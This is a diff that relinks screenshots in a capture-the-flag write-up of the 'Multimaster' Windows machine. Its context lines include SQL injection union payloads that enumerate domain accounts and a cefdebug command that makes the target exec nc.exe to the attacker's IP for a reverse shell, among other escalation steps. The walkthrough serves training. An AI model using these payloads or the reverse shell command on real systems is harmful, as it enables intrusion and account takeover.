@@ -117,25 +117,25 @@ SMB does not allow us to access anything without credentials for this machine.
 
 Port 80 shows us a dashboard of some sorts:
 
-![](<../../../.gitbook/assets/image%20(2664).png>)
+![](../../../.gitbook/assets/multimaster-10.png)
 
 There were some functions, and the one that stood out was the 'Colleague Finder', which took one name parameter.
 
-![](<../../../.gitbook/assets/image%20(2048).png>)
+![](../../../.gitbook/assets/multimaster-7.png)
 
 If nothing is entered, then all the employees are returned.
 
-![](<../../../.gitbook/assets/image%20(3520).png>)
+![](../../../.gitbook/assets/multimaster-12.png)
 
 We can take note of these usernames for later. More importantly, we should see how this thing processes queries. When viewed in Burpsuite, the request simply sent a POST request to `/api/getColleagues` and it returns a response.
 
-![](<../../../.gitbook/assets/image%20(1706).png>)
+![](../../../.gitbook/assets/multimaster-4.png)
 
 This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.
 
 UTF-8 characters are a bit special as they are denoted like `\u12` or something. If I try to use `\u12` as the input, I get an error instead of being blocked.
 
-![](<../../../.gitbook/assets/image%20(3809).png>)
+![](../../../.gitbook/assets/multimaster-13.png)
 
 This likely indicates that our query has caused a backend error. Using this, we can try some of the `sqlmap` tampers that are available:
 
@@ -349,7 +349,7 @@ I used this site to encode it into a suitable UTF-8 format:
 
 Testing it worked!
 
-![](<../../../.gitbook/assets/image%20(400).png>)
+![](../../../.gitbook/assets/multimaster-14.png)
 
 We can then try to enumerate the Administrator user using this payload:
 
@@ -359,7 +359,7 @@ a' union select 1,1,1,1,(select sys.fn_varbintohexstr(SUSER_SID('megacorp\Admini
 
 This would result in some hex being returned:
 
-![](<../../../.gitbook/assets/image%20(1038).png>)
+![](../../../.gitbook/assets/multimaster-1.png)
 
 We can use this to send another query that would return usernames and convert the SID for us.
 
@@ -367,7 +367,7 @@ We can use this to send another query that would return usernames and convert th
 a' union select 1,1,1,1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)--
 ```
 
-![](<../../../.gitbook/assets/image%20(1240).png>)
+![](../../../.gitbook/assets/multimaster-2.png)
 
 Now, we just need a way to automate this method. I took the two functions used to convert the hex to a valid SID from the user earlier.
 
@@ -382,7 +382,7 @@ Then, we can fit this SID into a payload with a test number of 1000.
 a' union select 1,1,1,1,(SUSER_SNAME(SID_BINARY('S-1-5-21-3167813660-1240564177-918740779-1000')))--
 ```
 
-![](<../../../.gitbook/assets/image%20(915).png>)
+![](../../../.gitbook/assets/multimaster-18.png)
 
 This is the final script I used to automate this method:
 
@@ -498,7 +498,7 @@ SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikika
 
 I was then able to `evil-winrm` in as this user:
 
-![](<../../../.gitbook/assets/image%20(899).png>)
+![](../../../.gitbook/assets/multimaster-17.png)
 
 ## Privilege Escalation
 
@@ -610,13 +610,13 @@ Start Bloodhound and upload the information as usual. Then, we can check each us
 
 First, we find that `cyork` is part of the Developers group:
 
-![](<../../../.gitbook/assets/image%20(2250).png>)
+![](../../../.gitbook/assets/multimaster-8.png)
 
 There are no outbound object controls for this, indicating that this group might have access to somestuff on the machine.
 
 We can also find that the `sbauer` user has some privileges over `jorden`.
 
-![](<../../../.gitbook/assets/image%20(2753).png>)
+![](../../../.gitbook/assets/multimaster-11.png)
 
 The rest of the users don't have anything interesting about them. I also used `PrivescCheck.ps1` to enumerate for me since WinPEAS was not working for some reason. Here was the interesting output:
 
@@ -750,7 +750,7 @@ This exploit was weird, as it took me ages to get a shell, but I eventually did.
 .\cefdebug --code "process.mainModule.require('child_process').exec('C:/Windows/Tasks/nc.exe 10.10.14.42 443 -e cmd')" --url ws://127.0.0.1:2306/58c5d2a4-d072-479b-a0ad-6762d38e5a36
 ```
 
-![](<../../../.gitbook/assets/image%20(862).png>)
+![](../../../.gitbook/assets/multimaster-15.png)
 
 ### Inetpub DLL -> Credentials
 
@@ -888,7 +888,7 @@ The `Web.Config` file doesn't seem to use it, making it weirder. I downloaded th
 
 Within it, we can find some hardcoded credentials:
 
-![](<../../../.gitbook/assets/image%20(2319).png>)
+![](../../../.gitbook/assets/multimaster-9.png)
 
 Since we have access to the `C:\Users` directory, we can check which user is this password valid with, and `sbauer` is the one!
 
@@ -900,13 +900,13 @@ SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3
 
 We can then `evil-winrm` in as this user:
 
-![](<../../../.gitbook/assets/image%20(1366).png>)
+![](../../../.gitbook/assets/multimaster-3.png)
 
 ### GenericWrite -> Jorden Shell
 
 From the Bloodhond we did earlier, we can see that this user has `GenericWrite` privileges over `jorden`:
 
-![](<../../../.gitbook/assets/image%20(1908).png>)
+![](../../../.gitbook/assets/multimaster-5.png)
 
 To exploit this, we can use PowerView.ps1. However, it seems AMSI is blocking us:
 
@@ -985,7 +985,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-![](<../../../.gitbook/assets/image%20(892).png>)
+![](../../../.gitbook/assets/multimaster-16.png)
 
 ### Server Operators -> Root
 
@@ -1100,6 +1100,6 @@ The first service I noticed were `browser` and `bowser`. I just thought the latt
 *Evil-WinRM* PS C:\Windows\Tasks> sc.exe start browser
 ```
 
-![](<../../../.gitbook/assets/image%20(1920).png>)
+![](../../../.gitbook/assets/multimaster-6.png)
 
 Rooted!
